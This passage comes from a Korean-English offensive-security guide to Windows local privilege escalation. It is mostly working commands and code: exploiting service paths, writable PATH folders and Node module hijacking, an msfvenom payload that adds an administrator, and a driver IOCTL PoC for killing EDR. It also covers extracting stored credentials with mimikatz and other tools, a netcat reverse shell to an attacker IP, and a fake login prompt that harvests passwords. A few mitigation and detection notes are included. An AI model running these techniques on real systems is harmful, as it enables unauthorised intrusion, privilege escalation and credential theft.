for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**이 취약점은** metasploit로 탐지하고 익스플로잇할 수 있습니다: `exploit/windows/local/trusted\_service\_path` metasploit로 서비스 binary를 수동으로 생성할 수 있습니다:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Windows는 서비스가 실패했을 때 수행할 작업을 사용자가 지정할 수 있도록 허용한다. 이 기능은 binary를 가리키도록 설정할 수 있다. 이 binary를 교체할 수 있다면, privilege escalation이 가능할 수 있다. 더 자세한 내용은 [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)에서 확인할 수 있다.

## Applications

### Installed Applications

**binaries의 permissions**(하나를 덮어쓸 수 있고 privilege escalation할 수 있을지도 모른다)과 **folders**([DLL Hijacking](dll-hijacking/index.html))의 permissions를 확인하라.
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 쓰기 권한

특정 파일을 읽기 위해 어떤 설정 파일을 수정할 수 있는지, 또는 Administrator 계정으로 실행될 binary를 수정할 수 있는지(schedtasks) 확인하세요.

시스템에서 취약한 folder/files permissions를 찾는 방법은 다음과 같습니다:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++는 `plugins` 하위 폴더에 있는 모든 plugin DLL을 자동 로드합니다. writable portable/copy install이 있으면, malicious plugin을 넣는 것만으로 `notepad++.exe`가 실행될 때마다 자동 code execution이 발생합니다(`DllMain`과 plugin callbacks 포함).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**다른 user에 의해 실행될 registry나 binary를 overwrite할 수 있는지 확인하세요.**\
**권한 상승을 위해 흥미로운 **autoruns locations**에 대해 더 알아보려면 다음 페이지를 읽으세요:**


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

가능한 **third party weird/vulnerable** drivers를 찾아보세요
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
If a driver exposes an arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), you can escalate by stealing a SYSTEM token directly from kernel memory. See the step‑by‑step technique here:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

For race-condition bugs where the vulnerable call opens an attacker-controlled Object Manager path, deliberately slowing the lookup (using max-length components or deep directory chains) can stretch the window from microseconds to tens of microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities let you groom deterministic layouts, abuse writable HKLM/HKU descendants, and convert metadata corruption into kernel paged-pool overflows without a custom driver. Learn the full chain here:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Some signed third‑party drivers create their device object with a strong SDDL via IoCreateDeviceSecure but forget to set FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics. Without this flag, the secure DACL is not enforced when the device is opened through a path containing an extra component, letting any unprivileged user obtain a handle by using a namespace path like:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Once a user can open the device, privileged IOCTLs exposed by the driver can be abused for LPE and tampering. Example capabilities observed in the wild:
- Return full-access handles to arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Terminate arbitrary processes, including Protected Process/Light (PP/PPL), allowing AV/EDR kill from user land via kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
개발자를 위한 완화책
- DACL로 제한하려는 device objects를 만들 때는 항상 FILE_DEVICE_SECURE_OPEN을 설정하세요.
- privileged 작업에 대해 caller context를 검증하세요. process termination 또는 handle returns를 허용하기 전에 PP/PPL checks를 추가하세요.
- IOCTLs(access masks, METHOD_*, input validation)를 제한하고, 직접적인 kernel privileges 대신 brokered models를 고려하세요.

방어자를 위한 탐지 아이디어
- 의심스러운 device names(예: \\ .\\amsdk*)에 대한 user-mode opens와 남용을 나타내는 특정 IOCTL sequences를 모니터링하세요.
- Microsoft의 vulnerable driver blocklist(HVCI/WDAC/Smart App Control)를 적용하고, 자체 allow/deny lists도 유지하세요.


## PATH DLL Hijacking

PATH에 있는 folder 내부에 **write permissions**가 있다면, process가 로드하는 DLL을 hijack해서 **privileges를 escalate**할 수 있습니다.

PATH 안의 모든 folder permissions를 확인하세요:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
더 많은 정보를 원하면 이 체크를 악용하는 방법은 다음을 참고하세요:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking via `C:\node_modules`

이것은 **Windows uncontrolled search path** 변종으로, **Node.js** 및 **Electron** 애플리케이션이 `require("foo")` 같은 bare import를 수행하고 기대한 module이 **missing**일 때 영향을 줍니다.

Node는 디렉터리 트리를 위로 올라가면서 각 상위 경로의 `node_modules` 폴더를 확인해 package를 resolve합니다. Windows에서는 이 탐색이 드라이브 루트까지 도달할 수 있으므로, `C:\Users\Administrator\project\app.js`에서 실행된 애플리케이션은 다음을 probe할 수 있습니다:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**low-privileged user**가 `C:\node_modules`를 생성할 수 있다면, 악성 `foo.js`(또는 package folder)를 심어두고 더 높은 권한의 Node/Electron process가 누락된 dependency를 resolve하기를 기다릴 수 있습니다. payload는 피해자 process의 security context에서 실행되므로, 대상이 administrator로 실행되거나, elevated scheduled task/service wrapper를 통해 실행되거나, auto-start된 privileged desktop app에서 실행될 때 이것은 **LPE**가 됩니다.

이 취약점은 특히 다음과 같은 경우에 흔합니다:

- dependency가 `optionalDependencies`에 선언된 경우
- third-party library가 `try/catch`로 `require("foo")`를 감싸고 실패해도 계속 진행하는 경우
- package가 production build에서 제거되었거나, packaging 중 누락되었거나, 설치에 실패한 경우
- 취약한 `require()`가 main application code가 아니라 dependency tree 깊숙한 곳에 있는 경우

### 취약한 대상 찾기

**Procmon**을 사용해 resolution path를 확인하세요:

- Filter by `Process Name` = 대상 executable (`node.exe`, Electron app EXE, 또는 wrapper process)
- Filter by `Path` `contains` `node_modules`
- `NAME NOT FOUND`와 `C:\node_modules` 아래의 최종 성공 open에 집중

압축 해제된 `.asar` 파일이나 application source에서 유용한 code-review 패턴:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Procmon 또는 source review에서 **missing package name**을 식별합니다.
2. root lookup directory가 아직 존재하지 않으면 생성합니다:
```powershell
mkdir C:\node_modules
```
3. 정확히 예상되는 이름의 module을 drop:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. 피해 애플리케이션을 트리거한다. 애플리케이션이 `require("foo")`를 시도하고 정식 모듈이 없으면, Node는 `C:\node_modules\foo.js`를 로드할 수 있다.

이 패턴에 맞는 누락된 optional module의 실제 예로는 `bluebird`와 `utf-8-validate`가 있지만, **technique**는 재사용 가능한 부분이다: 권한이 높은 Windows Node/Electron 프로세스가 resolve할 임의의 **missing bare import**를 찾아라.

### Detection and hardening ideas

- 사용자가 `C:\node_modules`를 만들거나 그 안에 새로운 `.js` 파일/package를 쓸 때 알림을 설정한다.
- 높은 무결성(high-integrity) 프로세스가 `C:\node_modules\*`에서 읽는지 추적한다.
- 운영 환경에서는 모든 runtime dependencies를 패키징하고 `optionalDependencies` 사용을 감사한다.
- 타사 코드의 조용한 `try { require("...") } catch {}` 패턴을 검토한다.
- 라이브러리가 지원한다면 optional probe를 비활성화한다(예: 일부 `ws` 배포는 `WS_NO_UTF_8_VALIDATE=1`로 레거시 `utf-8-validate` probe를 피할 수 있다).

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts 파일에 하드코딩된 다른 알려진 컴퓨터가 있는지 확인합니다
```
type C:\Windows\System32\drivers\etc\hosts
```
### Network Interfaces & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

외부에서 **restricted services**를 확인합니다
```bash
netstat -ano #Opened ports?
```
### 라우팅 테이블
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP 테이블
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### 방화벽 규칙

[**방화벽 관련 명령은 이 페이지를 확인하세요**](../basic-cmd-for-pentesters.md#firewall) **(규칙 목록, 규칙 생성, 끄기, 끄기...)**

네트워크 열거를 위한 더 많은 [명령은 여기](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe`는 `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`에서도 찾을 수 있습니다.

root 사용자를 얻으면 어떤 포트에서든 listen할 수 있습니다(`nc.exe`를 처음으로 포트에서 listen하는 데 사용하면, 방화벽에서 `nc`를 허용할지 GUI로 묻습니다).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
쉽게 root로 bash를 시작하려면 `--default-user root`를 시도할 수 있습니다

`WSL` 파일시스템은 `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` 폴더에서 탐색할 수 있습니다

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault는 서버, 웹사이트 및 기타 프로그램에 대한 사용자 자격 증명을 저장하며, **Windows**가 사용자에게 **자동으로 로그인할 수** 있게 합니다. 처음 보면 이제 사용자가 Facebook, Twitter, Gmail 등의 자격 증명을 저장해 브라우저를 통해 자동으로 로그인할 수 있는 것처럼 보일 수 있습니다. 하지만 그렇지 않습니다.

Windows Vault는 Windows가 사용자에게 자동으로 로그인할 수 있는 자격 증명을 저장합니다. 즉, **리소스(서버 또는 웹사이트)에 접근하기 위해 자격 증명이 필요한 Windows 애플리케이션**은 이 Credential Manager와 Windows Vault를 사용해, 사용자가 매번 사용자 이름과 비밀번호를 입력하는 대신 제공된 자격 증명을 사용할 수 있습니다.

애플리케이션이 Credential Manager와 상호작용하지 않으면, 특정 리소스에 대한 자격 증명을 사용하는 것은 불가능하다고 생각합니다. 따라서 애플리케이션이 vault를 사용하려면, 기본 저장 vault에서 **Credential Manager와 통신하고 해당 리소스의 자격 증명을 요청**해야 합니다.

`cmdkey`를 사용하여 시스템에 저장된 자격 증명을 나열하세요.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
그런 다음 저장된 자격 증명을 사용하기 위해 `/savecred` 옵션과 함께 `runas`를 사용할 수 있습니다. 다음 예시는 SMB share를 통해 원격 binary를 호출합니다.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
제공된 credential 세트로 `runas` 사용.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

**Data Protection API (DPAPI)**는 데이터를 대칭 암호화하는 방법을 제공하며, 주로 Windows 운영체제에서 비대칭 개인 키의 대칭 암호화에 사용된다. 이 암호화는 사용자 또는 시스템 비밀을 활용해 entropy에 크게 기여한다.

**DPAPI는 사용자의 로그인 비밀에서 파생된 대칭 키를 통해 키를 암호화할 수 있게 한다**. 시스템 암호화와 관련된 경우에는 시스템의 domain authentication secrets를 사용한다.

DPAPI를 사용해 암호화된 사용자 RSA 키는 `%APPDATA%\Microsoft\Protect\{SID}` 디렉터리에 저장되며, 여기서 `{SID}`는 사용자의 [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier)를 의미한다. **사용자의 private keys를 같은 파일에서 보호하는 master key와 함께 위치하는 DPAPI key**는 일반적으로 64바이트의 무작위 데이터로 구성된다. (이 디렉터리는 접근이 제한되어 있어 CMD의 `dir` 명령으로는 내용을 나열할 수 없지만, PowerShell로는 나열할 수 있다.)
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
You can use **mimikatz module** `dpapi::masterkey` with the appropriate arguments (`/pvk` or `/rpc`) to decrypt it.

**master password**로 보호된 **credentials files**는 보통 다음 위치에 있습니다:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.\
You can **extract many DPAPI** **masterkeys** from **memory** with the `sekurlsa::dpapi` module (if you are root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell 자격 증명**은 **스크립팅**과 자동화 작업에서 암호화된 자격 증명을 편리하게 저장하는 방법으로 자주 사용됩니다. 자격 증명은 **DPAPI**로 보호되며, 일반적으로 생성된 동일한 컴퓨터의 동일한 사용자만 복호화할 수 있음을 의미합니다.

파일에 들어 있는 PS 자격 증명을 **복호화**하려면 다음을 수행할 수 있습니다:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 저장된 RDP 연결

`HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
그리고 `HKCU\Software\Microsoft\Terminal Server Client\Servers\`에서 찾을 수 있습니다.

### 최근 실행한 명령어
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
If this file exists then it is possible that some **credentials** have been configured and can be **recovered**.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe`가 존재하는지 확인하세요 .\
설치 프로그램은 **SYSTEM 권한으로 실행**되며, 많은 경우 **DLL Sideloading**에 취약합니다 (**정보 출처:** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Files and Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### registry의 SSH keys

SSH private keys는 registry key `HKCU\Software\OpenSSH\Agent\Keys` 안에 저장될 수 있으므로, 그 안에 흥미로운 것이 있는지 확인해야 합니다:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
그 경로 안에서 어떤 항목을 찾으면, 아마 저장된 SSH 키일 것입니다. 그것은 암호화된 상태로 저장되지만 [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract)를 사용하면 쉽게 복호화할 수 있습니다.\
이 기법에 대한 더 많은 정보는 여기에서 확인할 수 있습니다: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

`ssh-agent` 서비스가 실행 중이 아니고 부팅 시 자동으로 시작되게 하려면 다음을 실행하세요:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> 이 technique는 더 이상 유효하지 않은 것 같습니다. 몇 개의 ssh keys를 만들어 `ssh-add`로 추가하고 ssh를 통해 machine에 login해 보았습니다. registry HKCU\Software\OpenSSH\Agent\Keys는 존재하지 않았고, procmon은 asymmetric key authentication 동안 `dpapi.dll` 사용을 식별하지 못했습니다.

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
또한 **metasploit**를 사용해 다음 파일들을 검색할 수 있습니다: _post/windows/gather/enum_unattend_

예시 내용:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM 백업
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** 파일을 검색하세요

### Cached GPP Pasword

이전에는 Group Policy Preferences (GPP)를 통해 여러 머신의 로컬 관리자 계정을 배포하는 기능이 제공되었습니다. 하지만 이 방법에는 심각한 보안 결함이 있었습니다. 첫째, SYSVOL에 XML 파일로 저장되는 Group Policy Objects (GPOs)는 모든 도메인 사용자가 접근할 수 있었습니다. 둘째, 공개적으로 문서화된 기본 키를 사용해 AES256으로 암호화된 이 GPPs의 비밀번호는 인증된 모든 사용자가 복호화할 수 있었습니다. 이는 사용자가 높은 권한을 획득할 수 있게 할 수 있어 심각한 위험이었습니다.

이 위험을 완화하기 위해, 비어 있지 않은 "cpassword" 필드를 포함한 로컬 캐시된 GPP 파일을 검색하는 함수가 개발되었습니다. 이러한 파일을 찾으면, 이 함수는 비밀번호를 복호화하고 사용자 지정 PowerShell 객체를 반환합니다. 이 객체에는 GPP의 세부 정보와 파일 위치가 포함되어 있어, 이 보안 취약점을 식별하고 조치하는 데 도움이 됩니다.

다음 파일들을 위해 `C:\ProgramData\Microsoft\Group Policy\history` 또는 _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_에서 검색하세요:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword를 복호화하려면:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec를 사용해 비밀번호 가져오기:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
자격 증명이 포함된 web.config 예시:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN credentials
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### 로그
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### 자격 증명 요청

사용자가 알고 있을 수 있다고 생각한다면, 언제든지 **사용자에게 자신의 자격 증명이나 다른 사용자의 자격 증명을 입력하라고 요청**할 수 있습니다(참고로, **클라이언트에게 직접** **자격 증명**을 **요청**하는 것은 매우 **위험**합니다):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
